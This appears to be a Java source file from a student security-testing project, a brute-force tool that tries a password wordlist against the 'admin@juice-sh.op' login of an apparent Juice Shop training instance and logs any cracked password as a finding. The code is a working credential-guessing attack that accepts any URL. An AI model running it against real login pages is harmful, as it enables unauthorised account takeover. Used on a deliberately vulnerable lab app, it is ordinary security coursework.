package fr.isep.projetseculogiciel;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.IOException;

import com.google.gson.*;
import com.google.gson.stream.JsonReader;

import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Paths;

public class BruteForceController {
    private JsonArray securityFailures;
    private boolean isVulnerable;
    private String message;
    private static final String FILENAME = "security_failures.json";

    public BruteForceController(String url, String username, String errorMessage, String passwordsFilePath) throws IOException {
        this.securityFailures = readJsonFromFile(FILENAME);
        this.isVulnerable = false;
        this.message = "";

        BufferedReader passwords = readPasswordsFromFile(passwordsFilePath);
        Result result = crack(url, username, errorMessage, passwords);

        // Access the results
        System.out.println("Is Vulnerable: " + result.isVulnerable);
        System.out.println("Message: " + result.message);

        writeJsonToFile(securityFailures, FILENAME);
    }

    public static void main(String[] args) throws IOException {
        if (args.length != 1) {
            System.out.println("Usage: java BruteForceController <URL>");
            return;
        }
        String url = args[0];
        String username = "admin@juice-sh.op";
        String errorMessage = "Invalid credentials";
        String passwordsFilePath = "src/main/resources/fr/isep/projetseculogiciel/Passwords.txt";

        new BruteForceController(url, username, errorMessage, passwordsFilePath);
    }

    private static class Result {
        boolean isVulnerable;
        String message;

        Result(boolean isVulnerable, String message) {
            this.isVulnerable = isVulnerable;
            this.message = message;
        }
    }

    private Result crack(String url, String username, String error_message, BufferedReader passwords) {
        int count = 0;
        String line;

        try {
            while ((line = passwords.readLine()) != null) {
                line = line.trim();
                count++;

                String data = "email=" + username + "&password=" + line + "&Log%20In=submit";
                byte[] postData = data.getBytes();

                HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                try (OutputStream os = connection.getOutputStream()) {
                    os.write(postData);
                }

                StringBuilder response = new StringBuilder();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    String inputLine;
                    while ((inputLine = br.readLine()) != null) {
                        response.append(inputLine);
                    }
                }

                if (!response.toString().contains(error_message)) {
                    // Password is correct, break the loop and record the successful attempt
                    isVulnerable = true;
                    message = "Password found: " + line;
                    JsonObject failure = new JsonObject();
                    failure.addProperty("security_failure_type", "Brute Force");
                    failure.addProperty("security_failure_location", url);
                    failure.addProperty("security_failure_severity", "High");
                    failure.addProperty("successful_password", line);

                    securityFailures.add(failure);
                    break;
                }
                // Continue trying other passwords
            }

            if (!isVulnerable) {
                message = "No successful password found.";
            }
        } catch (Exception e) {
            e.printStackTrace();
            isVulnerable = true;
            message = "Error during the brute force attempt.";
        }

        return new Result(isVulnerable, message);
    }

    private JsonArray readJsonFromFile(String filename) {
        JsonArray jsonArray = new JsonArray();
        if (Files.exists(Paths.get(filename))) {
            try (JsonReader reader = new JsonReader(new FileReader(filename))) {
                // Parse the JSON file content
                JsonElement fileContent = JsonParser.parseReader(reader);
                // Check if the file content is a JSON array
                if (fileContent != null && fileContent.isJsonArray()) {
                    jsonArray = fileContent.getAsJsonArray();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return jsonArray;
    }


    private void writeJsonToFile(JsonArray data, String filename) {
        try (FileWriter file = new FileWriter(filename, false)) { // Set append to false to overwrite
            Gson gson = new Gson();
            String json = gson.toJson(data);
            file.write(json); // Write JSON string
            System.out.println("Successfully written to " + filename);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static BufferedReader readPasswordsFromFile(String filePath) throws IOException {
        FileReader fileReader = new FileReader(filePath);
        return new BufferedReader(fileReader);
    }
}
